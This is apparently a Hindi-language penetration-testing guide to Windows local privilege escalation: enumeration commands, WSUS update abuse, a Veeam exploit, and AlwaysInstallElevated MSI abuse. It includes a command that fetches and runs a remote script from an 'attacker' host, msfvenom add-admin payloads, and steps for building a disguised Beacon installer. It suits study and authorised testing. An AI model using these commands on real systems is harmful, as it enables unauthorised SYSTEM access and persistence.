# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Windows local privilege escalation vectors खोजने के लिए सबसे अच्छा tool:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

यह पेज कई बुनियादी guides से सामान्य Windows privilege-escalation methodology को एक जगह समेटता है।<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> इसकी व्यावहारिक enumeration प्रक्रिया community workshops और checklists से भी ली गई है।<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> ऐतिहासिक attack सामग्री में Windows privilege escalation पर DerbyCon presentation शामिल है।<sup>[[5]](#references)</sup>

## शुरुआती Windows सिद्धांत

### Access Tokens

**अगर आपको नहीं पता कि Windows access tokens क्या हैं, तो आगे बढ़ने से पहले यह पेज पढ़ें:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs के बारे में अधिक जानकारी के लिए यह पेज देखें:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**अगर आपको नहीं पता कि Windows में integrity levels क्या हैं, तो आगे बढ़ने से पहले यह पेज पढ़ें:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

Windows में कुछ ऐसी चीज़ें हैं जो **आपको system enumerate करने से रोक सकती हैं**, executables चलाने से रोक सकती हैं या आपकी **गतिविधियों का पता लगा सकती हैं**। Privilege escalation enumeration शुरू करने से पहले, आपको यह **पेज पढ़ना चाहिए** और इन सभी **defense mechanisms की enumeration करनी चाहिए**:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

भौतिक पहुँच से offline UEFI NVRAM edit को pre-boot DMA और Windows `SYSTEM` memory-patching chain में भी बदला जा सकता है:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Admin Protection / UIAccess silent elevation

`RAiLaunchAdminProcess` के ज़रिए लॉन्च किए गए UIAccess processes, AppInfo secure-path checks को bypass किए जाने पर, prompts के बिना High IL तक पहुँचने के लिए abuse किए जा सकते हैं। UIAccess/Admin Protection bypass की विशेष workflow यहाँ देखें:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop accessibility registry propagation का दुरुपयोग arbitrary SYSTEM registry write (RegPwn) के लिए किया जा सकता है:<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Windows के हालिया builds में **SMB arbitrary-port** LPE path भी शामिल हुआ है, जिसमें privileged local NTLM authentication को reused SMB TCP connection के ज़रिए reflect किया जाता है:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## System Info

### Version info enumeration

जाँचें कि Windows version में कोई ज्ञात vulnerability है या नहीं (लागू किए गए patches भी जाँचें)।

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Version Exploits

यह [site](https://msrc.microsoft.com/update-guide/vulnerability) Microsoft की security vulnerabilities के बारे में विस्तृत जानकारी खोजने के लिए उपयोगी है। इस database में 4,700 से अधिक security vulnerabilities हैं, जो Windows environment के **massive attack surface** को दिखाती हैं।

**सिस्टम पर**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — OS build, installed updates और चुने गए advisory candidates की सूची बनाता है; किसी परिणाम को लागू मानने से पहले सटीक product और superseding updates की पुष्टि करें।

किसी version-specific local exploit के लिए, OS architecture के साथ **running process architecture** भी जाँचें। 64-bit Windows पर, 32-bit process [WOW64 file-system redirection](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector) के अधीन होता है: `%windir%\System32` आमतौर पर 32-bit system directory पर जाता है, जबकि `%windir%\Sysnative` उस process को native system directory तक पहुँच देता है। यह alias 64-bit process के लिए उपलब्ध नहीं है। OS build या missing-KB candidate से exploitability साबित नहीं होती; सटीक issue के लिए [Microsoft security bulletin](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) में running build, installed या superseding update, process architecture और exploit prerequisites की तुलना करें।

**System information के साथ स्थानीय रूप से**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Exploits के Github repos:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Environment

क्या env variables में कोई credential/Juicy info सेव है?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### PowerShell इतिहास

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### PowerShell Transcript फ़ाइलें

आप [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/) में इसे चालू करने का तरीका जान सकते हैं।

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` केवल एक उदाहरण है। [PowerShell transcription policy](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) आमतौर पर हर उपयोगकर्ता के Documents फ़ोल्डर में लिखती है, लेकिन `OutputDirectory` setting या `Start-Transcript -OutputDirectory` फ़ाइलों को किसी साझा या छिपे हुए फ़ोल्डर में भेज सकती है। Transcript की समीक्षा करने से पहले प्रभावी output path और फ़ाइल ACL जाँचें: इसमें command arguments और output हो सकते हैं, जिनमें credentials भी शामिल हैं। पढ़ने योग्य transcript तभी एक सुराग है, जब उसकी सामग्री किसी ऐसे उच्च-विशेषाधिकार वाले identity का खुलासा करे जिसका उपयोग किया जा सके और जो संबंधित context में log on कर सके।

### PowerShell Module Logging

PowerShell pipeline के executions का विवरण रिकॉर्ड किया जाता है, जिसमें चलाए गए commands, command invocations और scripts के कुछ हिस्से शामिल हैं। हालाँकि, execution का पूरा विवरण और output results शायद रिकॉर्ड न हों।

इसे enable करने के लिए documentation के "Transcript files" section में दिए गए निर्देशों का पालन करें और **"Powershell Transcription"** के बजाय **"Module Logging"** चुनें।

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

PowerShell logs से पिछले 15 events देखने के लिए आप यह चला सकते हैं:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

स्क्रिप्ट के निष्पादन की पूरी गतिविधि और संपूर्ण सामग्री का रिकॉर्ड दर्ज किया जाता है, जिससे यह सुनिश्चित होता है कि कोड के हर ब्लॉक को चलते समय दस्तावेज़ित किया जाए। यह प्रक्रिया हर गतिविधि का व्यापक audit trail सुरक्षित रखती है, जो forensics और दुर्भावनापूर्ण व्यवहार का विश्लेषण करने के लिए उपयोगी है। निष्पादन के समय सभी गतिविधियों को दस्तावेज़ित करके, प्रक्रिया के बारे में विस्तृत जानकारी प्रदान की जाती है।

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Script Block के लिए logging events Windows Event Viewer में इस path पर मिल सकते हैं: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**।\
पिछले 20 events देखने के लिए आप यह इस्तेमाल कर सकते हैं:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### इंटरनेट सेटिंग्स

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### ड्राइव‌లు

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

HTTP WSUS endpoint, update-metadata interception की जाँच के लिए एक सुराग है। Exploitation इस पर भी निर्भर करता है कि client उस WSUS server का उपयोग करता है या नहीं, attacker उसके traffic को intercept या control कर सकता है या नहीं, और client की update-trust तथा installation policy क्या है। केवल URL से code execution की पुष्टि नहीं होती। [Microsoft, WSUS metadata के लिए TLS की अनुशंसा करता है](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

आप यह जाँचने से शुरुआत करते हैं कि network में non-SSL WSUS update का उपयोग होता है या नहीं। इसके लिए cmd में यह चलाएँ:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

या PowerShell में निम्नलिखित:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

यदि आपको इनमें से कोई जवाब मिलता है:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

और यदि `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` या `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` का मान `1` हो।

जब `UseWUServer` का मान `1` होता है, तो Windows Update कॉन्फ़िगर की गई intranet service का उपयोग करता है। यह HTTP interception path के लिए एक पूर्वापेक्षा की पुष्टि करता है, लेकिन इससे यह साबित नहीं होता कि interception, malicious update की स्वीकृति या elevated installation संभव है। जब इसका मान `0` होता है, तो उस policy के अनुसार यह खास कॉन्फ़िगर किया गया WSUS endpoint चुना नहीं जाता।

इन vulnerabilities का exploit करने के लिए आप [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) जैसे tools इस्तेमाल कर सकते हैं—ये MiTM के लिए weaponized exploit scripts हैं, जो non-SSL WSUS traffic में 'fake' updates inject करते हैं।

यहाँ research पढ़ें:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**पूरी रिपोर्ट यहाँ पढ़ें**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
मूल रूप से, यह वही flaw है जिसका यह bug exploit करता है:

> यदि हमारे पास अपने local user proxy को modify करने की क्षमता है, और Windows Updates, Internet Explorer की settings में कॉन्फ़िगर किए गए proxy का उपयोग करता है, तो हम अपने asset पर स्थानीय रूप से [PyWSUS](https://github.com/GoSecure/pywsus) चला सकते हैं, अपने traffic को intercept कर सकते हैं और elevated user के रूप में code चला सकते हैं।
>
> इसके अलावा, चूँकि WSUS service वर्तमान user की settings का उपयोग करती है, यह उसके certificate store का भी उपयोग करेगी। यदि हम WSUS hostname के लिए self-signed certificate बनाकर उसे वर्तमान user के certificate store में जोड़ दें, तो हम HTTP और HTTPS—दोनों तरह के WSUS traffic को intercept कर पाएँगे। Certificate पर trust-on-first-use प्रकार का validation लागू करने के लिए WSUS, HSTS-जैसी कोई mechanism इस्तेमाल नहीं करता। यदि user को प्रस्तुत certificate trusted हो और उसका hostname सही हो, तो service उसे स्वीकार कर लेगी।

आप [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) tool से इस vulnerability का exploit कर सकते हैं (जब यह उपलब्ध हो जाए)।

### WSUS administrator द्वारा नियंत्रित updates

एक अलग path तब उपलब्ध होता है, जब वर्तमान identity किसी WSUS server पर updates **publish और approve** कर सकती है। Server के `WSUS Administrators` group की effective membership और किसी भी delegated WSUS permissions की जाँच करें, फिर उस client computer group की पहचान करें जिसे approved update मिलेगा। [Microsoft के अनुसार updates approve करने के लिए WSUS Administrator privileges आवश्यक हैं](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate), और [publishing trust relationship का दस्तावेज़ भी दिया गया है](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): clients को locally published content के लिए इस्तेमाल किए गए signing certificate पर trust करना होगा। इसे escalation path मानने से पहले पुष्टि करें कि candidate update signed और accepted है, target पर लागू होता है, और अधिक privileged context में install होता है। अकेला HTTP `WUServer` value या group name इन शर्तों को स्थापित नहीं करता।

### SUSDB custom-update का दुरुपयोग: `.txt`/`.esd` के ज़रिए unsigned payloads

यह HTTP WSUS connection को intercept करने से अलग trust-boundary failure है: इसके लिए **WSUS database (`SUSDB`) के stored procedures** तक इतनी access चाहिए कि custom update publish और approve किया जा सके। एक व्यावहारिक entry path में upstream WSUS computer account को ऐसे अलग MSSQL server पर relay करना शामिल है जो `SUSDB` host करता है; सटीक पूर्वापेक्षा deployment पर निर्भर करती है, इसलिए SQL administrator rights मान लेने के बजाय पहले `EXECUTE` permissions enumerate करें।<sup>[[38]](#references)[[39]](#references)</sup>

HTTP/8530 से LDAP, SMB या AD CS तक WSUS client authentication relay करने वाले अलग attack path के लिए, [NTLM relay के लिए WSUS HTTP का दुरुपयोग](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8) देखें।

#### Update बनाना, target करना और approve करना

Custom-update workflow, सीमित publishing API के रूप में वैध WSUS procedures का उपयोग करता है। महत्वपूर्ण state transitions ये हैं:<sup>[[38]](#references)</sup>

| चरण | संबंधित stored procedures |
| --- | --- |
| Update metadata import करना | `spImportUpdate` |
| Prerequisite, localized और extended XML fragments store करना | `spSaveXMLFragment` |
| Content digest को attacker-controlled URL से जोड़ना | `spSetBatchURL` |
| Computer group enumerate/create करना और client जोड़ना | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| उस group के लिए installation approve करना | `@actionID = 0` और `@isAssigned = 1` के साथ `spDeployUpdate` |

Imported metadata/fragments में file name, digests, size और `CommandLineInstallation` handler का आपस में मेल खाना ज़रूरी है। Content URL और target group assign करने के बाद, अंतिम approval कुछ इस तरह दिखता है; उदाहरण के GUIDs दोबारा इस्तेमाल करने के बजाय नए update, group और deployment identifiers का उपयोग करें।<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Extension-driven signature bypass

WSUS सामान्यतः मनमाने unsigned executable content को अस्वीकार करता है। हालांकि, `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll` में .NET का `VerifyFile` path, दिए गए filename के `.txt` या `.esd` पर समाप्त होने पर certificate-check flag को false सेट कर देता है; `CheckCertificateSignature` को यह साबित किए बिना छोड़ दिया जाता है कि bytes टेक्स्ट हैं या वैध ESD image। इसलिए `payload.exe.txt` नाम का अपरिवर्तित PE content verification पास कर सकता है और बाद में update के command-line installation handler द्वारा launch किया जा सकता है। यह signature forgery नहीं, बल्कि policy/type-confusion bug है।<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### BITS-संगत staging और automation

`spDeployUpdate` को call करने पर WSUS registered content को fetch करता है। Origin को BITS की HTTP अपेक्षाएँ पूरी करनी होंगी: केवल ऐसा URL होना जो पहुंच योग्य हो, पर्याप्त नहीं है, क्योंकि transfer में शुरुआती `HEAD`/`GET` flow और byte-range requests का उपयोग होता है। Range support के बिना server होने पर WSUS synchronization में `EventId=364` आता है, जिसमें बताया जाता है कि BITS को Range protocol header की आवश्यकता है।<sup>[[39]](#references)</sup>

Research PoC [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) import/fragment/URL/group/deployment chain के लिए आवश्यक SQL generate करता है, इसे execute करने के लिए modified MSSQL client शामिल करता है, और content staging के लिए `BitsWebServer.py` उपलब्ध कराता है। अधिकृत lab में इसका एक न्यूनतम invocation है:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Unattended execution और retry persistence

Client-side interaction policy पर निर्भर करता है। `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates` में विकल्प `4 - Auto download and schedule install` सक्षम होने पर स्वीकृत update डाउनलोड होकर कॉन्फ़िगर किए गए शेड्यूल पर इंस्टॉल हो जाता है; उपयोगकर्ता को इसे मैन्युअल रूप से चुनने की ज़रूरत नहीं होती। परीक्षण में, जिस payload का update विफल/अधूरा रहा, callback process के exit होते ही उसे फिर से ऑफ़र किया गया। इसलिए retry behavior बार-बार होने वाली execution persistence बन सकता है; यह शोर पैदा करता है, क्योंकि client update-failed स्थिति दिखाता है।<sup>[[39]](#references)</sup>

#### Detection और hardening के विकल्प

इस chain से जुड़े उपयोगी server- और client-side विकल्प हैं:<sup>[[39]](#references)</sup>

- `SUSDB` में `spCreateTargetGroup`, `spSetBatchURL` और `spDeployUpdate` के execution का audit करें; नए targeting groups, external content origins, `.txt`/`.esd` update payloads और अप्रत्याशित principals (विशेषकर non-computer accounts) द्वारा किए गए deployments की जाँच करें।
- `C:\Program Files\Update Services\LogFiles` में `ContentSyncAgent`, `FileVerified`, गलत वर्तनी वाले `FileVerficationFailed` और `EventId=364` देखें; verification को payload extension और content magic के साथ मिलाकर जाँचें, केवल suffix पर भरोसा न करें।
- Windows Update के बार-बार विफल होने/retry करने और `.txt` या `.esd` नाम वाले content से PE execution या अप्रत्याशित child/network activity की तलाश करें।
- जहाँ समर्थित हो, database service के लिए Extended Protection for Authentication अनिवार्य करें और database network access को WSUS server तथा अधिकृत administrative systems तक सीमित रखें। Custom-update procedures पर `EXECUTE` rights न्यूनतम रखें और उनका audit करें।

## Third-Party Auto-Updaters और Agent IPC (local privesc)

कई enterprise agents localhost IPC surface और privileged update channel उपलब्ध कराते हैं। यदि enrollment को attacker server की ओर मोड़ा जा सके और updater rogue root CA या कमज़ोर signer checks पर भरोसा करे, तो कोई local user malicious MSI भेज सकता है, जिसे SYSTEM service इंस्टॉल कर देती है। एक generalized technique (Netskope stAgentSvc chain – CVE-2025-0309 पर आधारित) यहाँ देखें:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (TCP 9401 के ज़रिए SYSTEM)

Veeam Backup & Replication और Cloud Connect डिफ़ॉल्ट रूप से **TCP/9401** पर core backup service का उपयोग करते हैं। [Veeam की advisory](https://www.veeam.com/kb4424) backup network perimeter के भीतर encrypted configuration-database credentials के unauthenticated disclosure का वर्णन करती है; एक अलग सार्वजनिक PoC **NT AUTHORITY\SYSTEM** के रूप में command-execution path दिखाता है।<sup>[[12]](#references)</sup> Service localhost से आगे भी bind हो सकती है, इसलिए उसका वास्तविक address और PID जाँचें।

- **Recon**: पुष्टि करें कि TCP/9401 `Veeam.Backup.Service.exe` का है, फिर इंस्टॉल किए गए product और patch metadata की जाँच करें। `netstat -ano | findstr 9401` और `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` संकेत हैं, patch की पूरी जाँच नहीं।
- **Fixed floors**: Veeam **11a build 11.0.1.1261 P20230227** और **12 build 12.0.0.1420 P20230223** को पहले fixed releases के रूप में सूचीबद्ध करता है; इससे पहले के releases प्रभावित हैं। चार भागों वाला file version अकेले, उन्हीं build numbers पर मौजूद unpatched base build और बाद के patch में अंतर नहीं बता सकता। किसी boundary build को fixed मानने से पहले [vendor build history](https://www.veeam.com/kb2680) के विरुद्ध patch identifier सत्यापित करें।
- **Exploit**: आवश्यक Veeam DLLs के साथ `VeeamHax.exe` जैसा PoC उसी directory में रखें, फिर local socket पर SYSTEM payload trigger करें:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

उद्धृत PoC दिखाता है कि अतिरिक्त पूर्वशर्तें पूरी होने पर SYSTEM के रूप में command execution संभव है; vendor की advisory credential-disclosure समस्या का वर्णन करती है।
## KrbRelayUp

एक local Kerberos relay, कम privilege वाले logon से privileged directory write तक पहुँच सकता है, जब कोई उपयुक्त COM server authenticate करे और relayed principal के पास target object पर अधिकार हों। [KrbRelay documents](https://github.com/cube0x0/KrbRelay) में RBCD और `msDS-KeyCredentialLink` (shadow-credential) LDAP writes, दोनों दर्ज हैं; KrbRelayUp इनमें से कुछ paths को automate करता है। RBCD chain के लिए लागू delegation और target-object rights आवश्यक हैं, जबकि shadow-credential chain के लिए key-credential write rights और ऐसा KDC आवश्यक है जो certificate authentication path को support करता हो। इनमें से कोई भी path केवल domain membership से संभव नहीं होता।

वास्तविक DC की [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) और [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding) policy, relayed identity की object ACL, और चुनी गई COM class के authentication तथा impersonation levels जाँचें। Caller का logon type और credential context भी मायने रखते हैं: WinRM session का व्यवहार interactive या new-credentials logon से अलग हो सकता है। Firewall/OXID routing और installed updates भी परिणाम बदल सकते हैं। Permissive policy या matching ACL को review candidate मानें; passive enumeration से COM coercion, relay authentication या directory writes शुरू नहीं होने चाहिए। Machine-account shadow credential से machine ticket मिल सकता है और, केवल तभी जब उस account के पास आवश्यक directory replication rights हों, एक अलग DCSync path भी संभव हो सकता है।

[**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp) में **exploit ढूँढ़ें**

Attack के flow के बारे में अधिक जानकारी के लिए देखें [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

**यदि** ये 2 registry keys **enabled** हों (value **0x1** हो), तो किसी भी privilege वाले users `*.msi` files को NT AUTHORITY\\**SYSTEM** के रूप में **install** (execute) कर सकते हैं।

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

यदि आपके पास meterpreter session है, तो आप module **`exploit/windows/local/always_install_elevated`** का उपयोग करके इस technique को automate कर सकते हैं।

### PowerUP

privileges escalate करने के लिए, current directory में Windows MSI binary बनाने हेतु power-up से `Write-UserAddMSI` command का उपयोग करें। यह script एक precompiled MSI installer लिखती है, जो user/group जोड़ने के लिए prompt करता है (इसलिए आपको GIU access की आवश्यकता होगी):

```
Write-UserAddMSI
```

बस privilege escalation करने के लिए बनाई गई binary को execute करें।

### MSI Wrapper

इस टूल का उपयोग करके MSI wrapper बनाने का तरीका जानने के लिए यह tutorial पढ़ें। ध्यान दें कि यदि आप **सिर्फ** **command lines** को **execute** करना चाहते हैं, तो आप "**.bat**" file को wrap कर सकते हैं।


{{#ref}}
msi-wrapper.md
{{#endref}}

### WIX के साथ MSI बनाएँ


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Visual Studio के साथ MSI बनाएँ

- Cobalt Strike या Metasploit से एक **नया Windows EXE TCP payload** **`C:\privesc\beacon.exe`** में **generate** करें।
- **Visual Studio** खोलें, **Create a new project** चुनें और search box में "installer" टाइप करें। **Setup Wizard** project चुनें और **Next** पर क्लिक करें।
- Project का नाम दें, जैसे **AlwaysPrivesc**, location के लिए **`C:\privesc`** का उपयोग करें, **place solution and project in the same directory** चुनें और **Create** पर क्लिक करें।
- चरण 3 of 4 (शामिल करने के लिए files चुनें) तक पहुँचने के लिए **Next** पर क्लिक करते रहें। **Add** पर क्लिक करें और अभी generate किया हुआ Beacon payload चुनें। फिर **Finish** पर क्लिक करें।
- **Solution Explorer** में **AlwaysPrivesc** project को highlight करें और **Properties** में **TargetPlatform** को **x86** से **x64** में बदलें।
  - आप अन्य properties भी बदल सकते हैं, जैसे **Author** और **Manufacturer**, जिससे installed app अधिक वैध दिख सकती है।
- Project पर right-click करें और **View > Custom Actions** चुनें।
- **Install** पर right-click करें और **Add Custom Action** चुनें।
- **Application Folder** पर double-click करें, अपनी **beacon.exe** file चुनें और **OK** पर क्लिक करें। इससे यह सुनिश्चित होगा कि installer चलाते ही beacon payload execute हो जाए।
- **Custom Action Properties** के अंतर्गत, **Run64Bit** को **True** में बदलें।
- अंत में, **build it**।
  - यदि चेतावनी `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` दिखाई दे, तो सुनिश्चित करें कि आपने platform को x64 पर सेट किया है।

### MSI Installation

malicious `.msi` file को **background** में **install** करने के लिए:

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

इस vulnerability का exploit करने के लिए आप यह इस्तेमाल कर सकते हैं: _exploit/windows/local/always_install_elevated_

## Antivirus and Detectors

### Audit Settings

इन सेटिंग्स से तय होता है कि क्या **लॉग** किया जा रहा है, इसलिए आपको ध्यान देना चाहिए

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding में यह जानना दिलचस्प है कि logs कहाँ भेजे जाते हैं.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS** को domain से जुड़े कंप्यूटरों पर **local Administrator passwords के प्रबंधन** के लिए डिज़ाइन किया गया है, ताकि हर password **अद्वितीय, randomised और नियमित रूप से अपडेट** हो। ये passwords Active Directory में सुरक्षित रूप से संग्रहीत होते हैं और इन्हें केवल वे users access कर सकते हैं जिन्हें ACLs के ज़रिए पर्याप्त permissions दी गई हों। इससे वे अधिकृत होने पर local admin passwords देख सकते हैं।


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

सक्रिय होने पर, **plain-text passwords LSASS** (Local Security Authority Subsystem Service) में संग्रहीत होते हैं।\
[**इस पेज पर WDigest के बारे में अधिक जानकारी**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA Protection

**Windows 8.1** से शुरू होकर, Microsoft ने Local Security Authority (LSA) के लिए बेहतर सुरक्षा पेश की, ताकि सिस्टम को और सुरक्षित बनाते हुए, अविश्वसनीय processes द्वारा इसकी **memory पढ़ने** या code inject करने के प्रयासों को **रोका** जा सके।\
[**LSA Protection के बारे में अधिक जानकारी यहाँ**](../stealing-credentials/credentials-protections.md#lsa-protection).

